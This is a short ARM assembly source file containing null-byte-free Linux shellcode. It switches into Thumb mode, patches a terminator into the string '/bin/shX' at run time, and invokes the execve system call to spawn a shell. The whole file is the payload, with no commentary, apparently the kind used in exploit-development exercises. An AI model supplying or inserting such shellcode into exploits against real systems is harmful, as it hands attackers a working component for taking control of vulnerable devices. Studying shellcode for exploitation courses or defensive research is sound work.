.section .text
.global _start

_start:
        .code 32
        add r1, pc, #1
        bx r1

        .code 16
        adr r0, shell
        sub r1, r1, r1
        sub r2, r2, r2
        strb r2, [r0, #7]
        mov r7, #11
        svc #1

shell:
        .ascii "/bin/shX"
